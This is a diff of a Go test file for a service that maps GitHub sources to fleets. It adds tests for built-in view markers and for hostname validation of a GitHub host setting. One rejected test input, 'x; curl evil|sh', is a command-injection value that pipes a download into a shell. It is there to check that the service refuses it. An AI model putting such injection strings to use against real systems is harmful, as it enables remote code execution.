@@ -111,13 +111,11 @@ func TestTheReposRouteListsWhatRoutesToTheSourcesFleet(t *testing.T) {
 	newFakeGH(t)
 	rootA, rootB := t.TempDir(), t.TempDir()
 	mkCheckout(t, filepath.Join(rootA, "widgets"), "https://github.com/acme/widgets.git")
-	mkCheckout(t, filepath.Join(rootA, "tools"), "git@ghe.example.com:corp/tools.git")
 	mkCheckout(t, filepath.Join(rootB, "widgets-fork"), "https://github.com/acme/widgets.git")
 	mkCheckout(t, filepath.Join(rootB, "app"), "https://github.com/Bravo/App.git")
 	fleets := fmt.Sprintf(`"alpha":{"name":"Alpha","claude":{},"search_roots":[%q],"owners":["Globex"]},"bravo":{"name":"Bravo","claude":{},"search_roots":[%q]},"charlie":{"name":"Charlie","claude":{}}`, rootA, rootB)
 	f := newServiceFixture(t, ghConfig(fleets,
 		`"gha":{"plugin":"github","fleet":"alpha"},`+
-			`"ghe":{"plugin":"github","fleet":"alpha","settings":{"host":"ghe.example.com"}},`+
 			`"ghb":{"plugin":"github","fleet":"bravo"},`+
 			`"ghc":{"plugin":"github","fleet":"charlie"}`))
 	f.startSources()
@@ -141,10 +139,7 @@ func TestTheReposRouteListsWhatRoutesToTheSourcesFleet(t *testing.T) {
 		return out
 	}
 	if got := read("gha"); !reflect.DeepEqual(got, map[string]any{"repos": []any{"acme/widgets"}, "owners": []any{"globex"}, "default": true}) {
-		t.Errorf("alpha's repos = %v, want acme/widgets (checked out in both fleets, so the first has it), owner globex, default", got)
-	}
-	if got := read("ghe")["repos"]; !reflect.DeepEqual(got, []any{"corp/tools"}) {
-		t.Errorf("a source on ghe.example.com lists %v, want only that host's repos, [corp/tools]", got)
+		t.Errorf("alpha's repos = %v, want acme/widgets, owner globex, default", got)
 	}
 	if got := read("ghb"); !reflect.DeepEqual(got, map[string]any{"repos": []any{"bravo/app"}, "owners": []any{}, "default": false}) {
 		t.Errorf("bravo's repos = %v, want bravo/app, no owners as [], not the default", got)
@@ -157,6 +152,45 @@ func TestTheReposRouteListsWhatRoutesToTheSourcesFleet(t *testing.T) {
 	}
 	if got := readAll("ghc")["warnings"]; !reflect.DeepEqual(got, []any{}) {
 		t.Errorf("a fleet with no conflict has warnings %v, want [] and not null or absent", got)
+	}
+}
+
+func TestSettingsMarkEachBuiltInEntryAndNoCustomOne(t *testing.T) {
+	f := newServiceFixture(t, viewsConfig(`[`+builtinViewEntries+`,{"id":"my-prs","title":"Mine","query":"is:open"},{"title":"Bugs","query":"is:open label:bug"}]`))
+	code, body := f.do(http.MethodGet, "/gh/settings", nil)
+	if code != http.StatusOK {
+		t.Fatalf("GET settings = %d %s", code, body)
+	}
+	var got struct {
+		Settings struct {
+			Views []map[string]any `json:"views"`
+		} `json:"settings"`
+	}
+	if err := json.Unmarshal([]byte(body), &got); err != nil {
+		t.Fatal(err)
+	}
+	var marks []any
+	for _, v := range got.Settings.Views {
+		marks = append(marks, v["builtin"])
+	}
+	want := []any{true, true, true, true, nil, nil}
+	if !reflect.DeepEqual(marks, want) {
+		t.Errorf("builtin marks = %v, want %v: the first entry of a built-in id is that built-in, a repeat of it is no view and a custom view carries none", marks, want)
+	}
+}
+
+func TestSavingGitHubSettingsRefusesAHostThatIsNotAHostname(t *testing.T) {
+	f := newServiceFixture(t, viewsConfig(`[`+builtinViewEntries+`]`))
+	for _, host := range []string{"x; curl evil|sh", "ghe.acme.com/path", "a b", "-bad.com", "host:port"} {
+		code, body := f.do(http.MethodPut, "/gh", map[string]any{"settings": map[string]any{"host": host}})
+		if code != http.StatusBadRequest || !strings.Contains(body, "hostname") {
+			t.Errorf("host %q saved with %d %s, want 400 naming the hostname rule", host, code, body)
+		}
+	}
+	for _, host := range []string{"ghe.acme.com", "ghe.acme.com:8443", "github.com", ""} {
+		if code, body := f.do(http.MethodPut, "/gh", map[string]any{"settings": map[string]any{"host": host}}); code != http.StatusOK {
+			t.Errorf("host %q refused with %d %s, want it saved", host, code, body)
+		}
 	}
 }
 
